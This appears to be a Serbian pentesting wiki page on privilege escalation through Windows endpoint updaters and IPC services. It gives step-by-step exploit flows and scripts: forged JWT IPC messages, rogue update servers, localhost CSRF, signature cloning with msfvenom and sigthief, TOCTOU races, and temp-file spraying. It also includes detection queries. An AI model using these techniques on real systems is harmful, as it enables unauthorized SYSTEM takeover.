# Zloupotreba Enterprise Auto-Updaters i Privileged IPC (npr., Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica uopštava klasu Windows lanaca za lokalnu eskalaciju privilegija pronađenih u enterprise endpoint agentima i updaterima koji izlažu lako dostupnu IPC površinu i privilegovani update tok. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može da izazove enrollment ka serveru kojim upravlja napadač, a zatim isporuči malicious MSI koji SYSTEM servis instalira.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ključne ideje koje možete ponovo koristiti protiv sličnih proizvoda:
- Zloupotrebite localhost IPC privilegovanog servisa da biste primorali re-enrollment ili reconfiguration ka serveru napadača.
- Implementirajte vendor-ove update endpoints, isporučite rogue Trusted Root CA i usmerite updater ka malicious, „signed“ paketu.
- Zaobiđite slabe signer provere (CN allow-lists), opcione digest flags i labave MSI properties.
- Ako je IPC „encrypted“, izvedite key/IV iz machine identifiers čitljivih za sve korisnike, sačuvanih u registry-ju.
- Ako servis ograničava pozivaoce prema image path-u/process name-u, izvršite injection u allow-listed proces ili pokrenite takav proces suspended, a zatim učitajte svoj DLL putem minimalne izmene thread context-a.

---
## 1) Primoravanje enrollment-a ka serveru napadača putem localhost IPC-a

Mnogi agenti isporučuju user-mode UI proces koji komunicira sa SYSTEM servisom preko localhost TCP-a koristeći JSON.

Uočeno kod Netskope-a:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok exploit-a:
1) Napravite JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristite alg=None tako da potpis nije potreban.
2) Pošaljite IPC poruku koja poziva provisioning command sa vašim JWT-om i tenant name-om:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da šalje zahteve vašem rogue serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako je verifikacija poziva zasnovana na putanji/nazivu, pošaljite zahtev iz allow-listed vendor binary datoteke (pogledajte §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking update kanala radi pokretanja koda kao SYSTEM

Kada klijent počne da komunicira sa vašim serverom, implementirajte očekivane endpointe i usmerite ga na attacker MSI. Tipičan sled:

1) /v2/config/org/clientconfig → Vratite JSON config sa veoma kratkim updater intervalom, npr.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vratite PEM CA certificate. Service ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Prosledite metadata koja upućuju na malicious MSI i lažnu verziju.

Zaobilaženje uobičajenih provera koje se sreću u praksi:
- Signer CN allow-list: service može proveravati samo da li Subject CN odgovara vrednosti “netSkope Inc” ili “Netskope, Inc.”. Vaš rogue CA može izdati leaf sa tim CN-om i potpisati MSI.
- CERT_DIGEST property: uključite benigni MSI property pod nazivom CERT_DIGEST. Pri instalaciji se ne vrši enforcement.
- Optional digest enforcement: config flag (npr. check_msi_digest=false) onemogućava dodatnu cryptographic validation.

Rezultat: SYSTEM service instalira vaš MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava arbitrary code kao NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lekcija za patch-bypass: ako vendor reaguje tako što dozvoli mali skup “trusted” domena umesto da cryptographically authenticates update source, potražite vendor-owned redirectors ili reverse proxies koji vam i dalje omogućavaju usmeravanje saobraćaja. U Netskope slučaju, javno naknadno istraživanje pokazalo je da se allow-list iz R129 perioda i dalje mogao zloupotrebiti preko `rproxy.goskope.com`, koji je prosleđivao attacker-controlled Azure App Service sadržaj. Hostname allow-lists posmatrajte kao usporavanje napada, a ne kao trust boundary.<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (when present)

Od verzije R127, Netskope je obavio IPC JSON u polje encryptData koje izgleda kao Base64. Reversing je pokazao AES sa key/IV vrednostima izvedenim iz registry vrednosti koje su čitljive svakom useru:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers mogu reprodukovati encryption i slati valid encrypted commands kao standardni user.<sup>[[1]](#references)[[2]](#references)</sup> General tip: ako agent iznenada počne da “encrypts” svoj IPC, potražite device IDs, product GUIDs i install IDs pod HKLM i iskoristite ih kao material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Neki services pokušavaju da authenticate peer tako što razrešavaju PID TCP connection-a i porede image path/name sa allow-listed vendor binaries smeštenim pod Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična bypass-a:
- DLL injection u allow-listed process (npr. nsdiag.exe) i proxy IPC iz njega.
- Pokrenite allow-listed binary suspended i bootstrap-ujte svoj proxy DLL bez CreateRemoteThread (pogledajte §5) kako biste zadovoljili driver-enforced tamper rules.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products često isporučuju minifilter/OB callbacks driver (npr. Stadrv) koji uklanja dangerous rights sa handles ka protected processes:
- Process: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user-mode loader koji poštuje ova ograničenja:
1) CreateProcess vendor binary-ja sa CREATE_SUSPENDED.
2) Dobavite handles koji su vam i dalje dozvoljeni: PROCESS_VM_WRITE | PROCESS_VM_OPERATION za process i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patch-ujete code na poznatom RIP-u).
3) Overwrite-ujte ntdll!NtContinue (ili drugi early, guaranteed-mapped thunk) malim stubom koji poziva LoadLibraryW nad putanjom do vašeg DLL-a, a zatim se vraća nazad.
4) ResumeThread kako biste pokrenuli svoj stub u process-u i učitali DLL.

Pošto nikada niste koristili PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME nad već protected process-om (vi ste ga kreirali), driver policy je zadovoljen.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizuje rogue CA, malicious MSI signing i poslužuje potrebne endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope je custom IPC client koji kreira arbitrary (opciono AES-encrypted) IPC messages i uključuje suspended-process injection kako bi poticali iz allow-listed binary-ja.<sup>[[4]](#references)</sup>

## 7) Fast triage workflow for unknown updater/IPC surfaces

Kada se susretnete sa novim endpoint agentom ili motherboard “helper” suite-om, brzi workflow je obično dovoljan da utvrdite da li posmatrate obećavajuću privesc metu:<sup>[[6]](#references)</sup>

1) Enumerate loopback listeners i mapirajte ih na vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Izlistajte potencijalne named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Prikupite routing podatke iz registry-ja koje koriste plugin-based IPC serveri:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Najpre izdvojite nazive endpointa, JSON ključeve i ID-jeve komandi iz user-mode klijenta. Packed Electron/.NET frontendi često leak-uju kompletnu šemu:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Potražite stvarni uslov poverenja, a ne samo putanju koda koja na kraju pokreće proces:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Obrasci kojima vredi dati prioritet:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji“ tretirano kao „sertifikat je pouzdan“, što omogućava kloniranje sertifikata ili druge trikove sa lažnim potpisnikom.
- Provere podniske/sufiksa nad `Origin`, `Referer`, URL-ovima za preuzimanje, imenima procesa ili CN-ovima potpisnika nisu autentikacija. `contains(".vendor.com")` je obično exploitable uz napadačeve lookalike domene.
- Ako GUI sa niskim privilegijama odlučuje da je „fajl pouzdan“, a SYSTEM broker samo koristi taj rezultat, patching ili ponovna implementacija DLL/JS klijentske strane često potpuno zaobilazi granicu (split validation u stilu Razer-a).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp`, a zatim ga validira ili zakazuje sa te putanje, odmah testirajte TOCTOU replacement prozore i susedne plugin module koji izlažu alternativne `ExecuteTask()` wrapper-e sa slabijim proverama.<sup>[[6]](#references)</sup>

Za targete sa velikim brojem named pipe-ova, PipeViewer je brz način da uočite slabe DACL-ove i remotely reachable pipe-ove pre nego što počnete detaljno reverse engineering protokola.<sup>[[11]](#references)</sup>

Ako target autentikuje pozivaoce samo pomoću PID-a, putanje image-a ili imena procesa, tretirajte to kao usporavanje, a ne kao granicu: injecting u legitimni klijent ili uspostavljanje konekcije iz allow-listed procesa često je dovoljno za ispunjavanje serverovih provera. Konkretno za named pipe-ove, [ova stranica o client impersonation i pipe abuse-u](named-pipe-client-impersonation.md) detaljnije obrađuje ovaj primitive.

---
## 8) Modularni add-in brokeri koji se autentikuju samo pomoću vendor potpisa (Lenovo Vantage obrazac)

Novija varijacija koju vredi tražiti jeste **signed-client RPC broker**: desktop proces sa niskim privilegijama, potpisan od strane Lenovo-a, komunicira sa SYSTEM servisom, a servis prosleđuje JSON komande skupu XML-opisanih add-in-ova u `%ProgramData%`. Kada se postigne code execution **unutar bilo kog prihvaćenog signed client-a**, svaki ugovor sa `runas="system"` postaje deo vaše attack surface.<sup>[[15]](#references)</sup>

Vredni primitives uočeni tokom istraživanja Lenovo Vantage-a:
- **Verovanje pozivaocu zato što je potpisan od strane vendor-a**: istraživači su došli do autentikovanog konteksta kopiranjem Lenovo-potpisanog EXE-a u direktorijum sa mogućnošću upisa i zadovoljavajući DLL side-load (`profapi.dll`), tako da je arbitrary code pokrenut unutar klijenta kome je servis već verovao.
- **Otkrivanje attack surface-a zasnovano na manifestima**: add-in-ovi su deklarisani u `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; nekoliko ugovora se izvršava kao `SYSTEM`, pa enumeracija tih manifesta često otkriva stvarne privilegovane verb-ove brže nego reverse engineering samog brokera.
- **Greške po komandama iza autentikovanog kanala**: kada se nađete unutar trusted client-a, javno istraživanje je pronašlo path traversal + race conditions u update/install verb-ovima, raw-SQL abuse u privilegovanim settings bazama i provere registry putanja zasnovane na podnisci koje su omogućile upis van predviđenog hive-a.

Korisni recon na targetu:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktični zaključak: kad god helper suite izlaže broker koji najpre autentifikuje **caller process**, a tek zatim prosleđuje zahteve desetinama plugin/add-in komandi, nemojte stati nakon zaobilaženja početne provere poverenja. Izvezite manifest/contract tabelu i fuzzujte svaki verb sa visokim privilegijama zasebno; autentifikovani kanal obično skriva nekoliko bugova druge faze.

---
## 1) Browser-to-localhost CSRF protiv privilegovanih HTTP API-ja (ASUS DriverHub)

DriverHub isporučuje user-mode HTTP service (ADU.exe) na 127.0.0.1:53000 koji očekuje browser pozive sa adrese https://driverhub.asus.com. Origin filter jednostavno izvršava `string_contains(".asus.com")` nad Origin headerom i nad download URL-ovima dostupnim preko `/asus/v1.0/*`. Zbog toga bilo koji host pod kontrolom napadača, kao što je `https://driverhub.asus.com.attacker.tld`, prolazi proveru i može da šalje zahteve koji menjaju stanje iz JavaScript-a.<sup>[[6]](#references)</sup> Pogledajte [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne obrasce zaobilaženja.

Praktičan tok:
1) Registrujte domen koji sadrži `.asus.com` i na njemu hostujte malicioznu web stranicu.
2) Koristite `fetch` ili XHR za pozivanje privilegovanog endpointa (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON telo koje handler očekuje – upakovani frontend JS prikazuje šemu u nastavku.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Čak i PowerShell CLI prikazan u nastavku uspeva kada se Origin zaglavlje lažira na pouzdanu vrednost:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Svaka poseta browsera napadačevom sajtu stoga postaje local CSRF sa 1 klikom (ili sa 0 klikova putem `onload`), koji pokreće SYSTEM helper.

---
## 2) Nesigurna verifikacija code-signing potpisa i kloniranje sertifikata (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne executable fajlove definisane u JSON telu zahteva i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Validacija URL-a za preuzimanje ponovo koristi istu substring logiku, pa se `http://updates.asus.com.attacker.tld:8000/payload.exe` prihvata. Nakon preuzimanja, ADU.exe samo proverava da PE sadrži potpis i da se Subject string podudara sa ASUS vrednošću pre nego što ga pokrene – nema `WinVerifyTrust`, niti validacije lanca.

Za weaponize ovog toka:
1) Kreirajte payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS signer u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na lookalike domenu `.asus.com` i pokrenite UpdateApp putem prethodno opisanog browser CSRF-a.

Pošto su i Origin i URL filteri zasnovani na substring proveri, a signer check samo upoređuje stringove, DriverHub preuzima i izvršava napadački binary u okviru svojih elevated privilegija.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU unutar updater putanja za kopiranje/izvršavanje (MSI Center CMD_AutoUpdateSDK)

SYSTEM servis aplikacije MSI Center izlaže TCP protokol u kojem je svaki frame oblika `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core komponenta (Component ID `0f 27 00 00`) sadrži `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njegov handler:
1) Kopira prosleđeni executable u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifikuje potpis putem `CS_CommonAPI.EX_CA::Verify` (subject sertifikata mora biti jednak vrednosti “MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` mora uspešno da prođe).
3) Kreira scheduled task koji pokreće temp fajl kao SYSTEM sa argumentima koje kontroliše napadač.

Kopirani fajl nije zaključan između verifikacije i `ExecuteTask()`. Napadač može da:
- Pošalje Frame A koji pokazuje na legitiman MSI-signed binary (garantuje prolazak provere potpisa i stavljanje taska u red).
- Utrkuje ga ponavljanim Frame B porukama koje pokazuju na malicious payload i prepisuju `MSI Center SDK.exe` odmah nakon završetka verifikacije.

Kada se scheduler aktivira, izvršava prepisani payload pod SYSTEM privilegijama, iako je prvobitno validirao originalni fajl. Pouzdana eksploatacija koristi dve goroutine/thread niti koje šalju CMD_AutoUpdateSDK poruke sve dok se ne dobije TOCTOU trka.<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Svaki plugin/DLL koji učita `MSI.CentralServer.exe` dobija Component ID sačuvan pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta frame-a biraju tu komponentu, što napadačima omogućava usmeravanje komandi ka proizvoljnim modulima.
- Plugin-i mogu da definišu sopstvene task runner-e. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` bez ikakve validacije potpisa – svaki local user može da ga usmeri na `C:\Users\<user>\Desktop\payload.exe` i deterministički dobije SYSTEM izvršavanje.
- Sniffing loopback sa Wireshark-om ili instrumentacija .NET binary-ja u dnSpy-ju brzo otkrivaju Component ↔ command mapiranje; custom Go/ Python klijenti zatim mogu da replay-uju frame-ove.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, a njegov discretionary ACL dozvoljava remote klijentima pristup (npr. `\\TARGET\pipe\treadstone_service_LightMode`). Slanje command ID-a `7` sa putanjom fajla poziva service-ovu rutinu za pokretanje procesa.
- Client library serijalizuje magic terminator byte (113) zajedno sa argumentima. Dynamic instrumentation pomoću Frida/`TsDotNetLib` (pogledajte [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) za savete o instrumentaciji) pokazuje da native handler mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i integrity SID pre pozivanja `CreateProcessAsUser`.
- Zamena vrednosti 113 (`0x71`) vrednošću 114 (`0x72`) prebacuje izvršavanje u generic branch koji zadržava puni SYSTEM token i postavlja high-integrity SID (`S-1-16-12288`). Pokrenuti binary stoga radi kao unrestricted SYSTEM, lokalno i između mašina.
- Kombinujte ovo sa izloženim installer flag-om (`Setup.exe -nocheck`) da biste pokrenuli ACC čak i na lab VM-ovima i testirali pipe bez vendor hardware-a.<sup>[[6]](#references)</sup>

Ovi IPC bug-ovi pokazuju zašto localhost servisi moraju da sprovode mutual authentication (ALPC SID-ovi, `ImpersonationLevel=Impersonation` filteri, token filtering) i zašto svaki modulov helper za “run arbitrary binary” mora da koristi iste signer verifikacije.

---
## 3) COM/IPC “elevator” helper-i podržani slabom user-mode validacijom (Razer Synapse 4)

Razer Synapse 4 dodaje još jedan koristan pattern ovoj porodici: low-privileged user može da zatraži od COM helper-a da pokrene proces preko `RzUtility.Elevator`, dok je odluka o trust-u delegirana user-mode DLL-u (`simple_service.dll`), umesto da se robusno sprovodi unutar privileged boundary-ja.

Uočeni exploitation path:
- Instancirajte COM objekat `RzUtility.Elevator`.
- Pozovite `LaunchProcessNoWait(<path>, "", 1)` da biste zatražili elevated launch.
- U javnom PoC-u, PE-signature gate unutar `simple_service.dll` se patch-uje pre slanja zahteva, čime se omogućava pokretanje proizvoljnog executable-a koji je izabrao napadač.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalna PowerShell invokacija:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Opšti zaključak: pri analizi „helper“ paketa nemojte se zaustaviti na localhost TCP-u ili imenovanim cevima. Proverite COM klase sa imenima kao što su `Elevator`, `Launcher`, `Updater` ili `Utility`, a zatim utvrdite da li privilegovani servis zaista validira ciljnu binarnu datoteku ili samo veruje rezultatu koji izračunava DLL klijenta u user-mode-u, koji je moguće izmeniti. Ovaj obrazac se može primeniti i van Razer-a: svaki dizajn sa podeljenim odgovornostima, gde broker sa visokim privilegijama preuzima odluku allow/deny sa strane sa niskim privilegijama, potencijalna je privesc površina.

---
## Predvidljivo izvršavanje privremenih skripti tokom MSI repair-a (Checkmk Agent / CVE-2024-0670)

Neki Windows agenti i dalje izvršavaju privilegovane radnje tako što upisuju privremeni `.cmd` fajl u `C:\Windows\Temp` i izvršavaju ga kao `SYSTEM`. Ako je naziv fajla predvidljiv, a servis ne kreira bezbedno postojeće fajlove ponovo, korisnik sa niskim privilegijama može unapred kreirati budući privremeni fajl kao **read-only** i navesti privilegovani proces da izvrši sadržaj pod kontrolom napadača umesto sopstvene skripte.

Uočeno u ranjivim verzijama Checkmk Agent-a:
- obrazac privremenog fajla: `cmk_all_<PID>_1.cmd`
- pogođene grane: `2.0.0`, `2.1.0`, `2.2.0`
- okidač: MSI **repair** keširanog agent paketa<sup>[[8]](#references)[[9]](#references)</sup>

Praktičan tok rada:
1. Proceni realan opseg PID-ova na osnovu trenutnih ID-ova procesa ili PID-a pokrenutog agenta.
2. Upiši kratak **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` ili preusmeravanje pomoću `cmd.exe`; izbegavaj PowerShell izlaz u UTF-16 formatu za batch fajlove).
3. Kreiraj fajlove `C:\Windows\Temp\cmk_all_<PID>_1.cmd` za ceo opseg kandidata i svaki označi kao read-only.
4. Pokreni repair keširanog MSI-ja tako da privilegovani servis pokuša da ponovo kreira, a zatim izvrši privremenu skriptu.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Ako je ranjivi proizvod instaliran pomoću Windows Installer-a, povežite nasumično imenovani keširani MSI u okviru `C:\Windows\Installer` sa nazivom proizvoda pre pokretanja popravke:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operativne napomene:
- `qwinsta` je koristan kada `msiexec /fa` ne uspe iz neinteraktivne WinRM shell sesije i potrebno je utvrditi da li postojeća desktop/isključena sesija može pravilno da pokrene repair.<sup>[[7]](#references)</sup>
- Ovaj obrazac se može primeniti i na druge endpoint agente i updatere koji **postavljaju privremene skripte na lokacije sa pravom upisa za sve korisnike, a zatim ih izvršavaju kao SYSTEM**. Testirajte predvidiva imena, nedostatak semantike ekskluzivnog kreiranja i repair/update tokove koji se mogu pokrenuti na zahtev.

---
## Remote supply-chain hijack putem slabe validacije updatera (WinGUp / Notepad++)

Između juna 2025. i decembra 2025, napadači koji su kompromitovali hosting infrastrukturu iza Notepad++ update toka selektivno su isporučivali zlonamerne manifeste odabranim žrtvama. Stariji updateri zasnovani na WinGUp-u nisu u potpunosti proveravali autentičnost update-a, pa je zlonamerni XML odgovor mogao da preusmeri klijente na URL-ove pod kontrolom napadača. Pošto je klijent prihvatao HTTPS sadržaj bez zahteva da preuzeti installer ima i pouzdan certificate chain i validan PE signature, žrtve su preuzimale i izvršavale trojanizovani NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operativni tok (nije potreban lokalni exploit):
1. **Infrastructure interception**: kompromitovati CDN/hosting i odgovarati na provere update-a metapodacima napadača koji upućuju na zlonamerni download URL.
2. **Trojanized NSIS**: installer preuzima/izvršava payload i zloupotrebljava dva execution chain-a:
- **Bring-your-own signed binary + sideload**: uključiti potpisani Bitdefender `BluetoothService.exe` i postaviti zlonamerni `log.dll` u njegov search path. Kada se potpisani binary pokrene, Windows sideload-uje `log.dll`, koji dešifruje i reflectively učitava Chrysalis backdoor (zaštićen pomoću Warbird-a + API hashing radi otežavanja statičke detekcije).
- **Scripted shellcode injection**: NSIS izvršava kompajliranu Lua skriptu koja koristi Win32 API-je (npr. `EnumWindowStationsW`) za injectovanje shellcode-a i postavljanje Cobalt Strike Beacon-a.<sup>[[12]](#references)</sup>

Zaključci za hardening/detekciju kod svakog auto-updatera:
- Zahtevajte **certificate + signature verification** preuzetog installera (pin-ujte vendor signer, odbijte neusklađeni CN/chain) i potpisujte sam update manifest (npr. XMLDSig). Blokirajte redirects kontrolisane manifestom dok se ne validiraju.
- Tretirajte **BYO signed binary sideloading** kao detection pivot nakon preuzimanja: generišite alert kada potpisani vendor EXE učita DLL ime izvan svog canonical install path-a (npr. kada Bitdefender učita `log.dll` iz Temp/Downloads) i kada updater postavlja/izvršava installere iz temp lokacije sa potpisima koji nisu vendorovi.
- Nadgledajte **malware-specific artifacts** uočene u ovom chain-u (korisne kao generički pivoti): mutex `Global\Jdhfv_1.0.1`, anomalne upise `gup.exe` u `%TEMP%` i Lua-driven shellcode injection faze.
- Notepad++ je odgovorio jačanjem WinGUp-a u verziji v8.8.9 i novijim verzijama: vraćeni XML je sada potpisan (XMLDSig), a noviji build-ovi zahtevaju certificate + signature verification preuzetog installera umesto oslanjanja samo na transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalacioni program koji nije za Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ovi obrasci se mogu generalizovati na svaki updater koji prihvata unsigned manifeste ili ne ograničava signere installera — network hijack + malicious installer + BYO-signed sideloading omogućavaju remote code execution pod maskom „trusted“ updates.

---
## Reference
- [1] [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
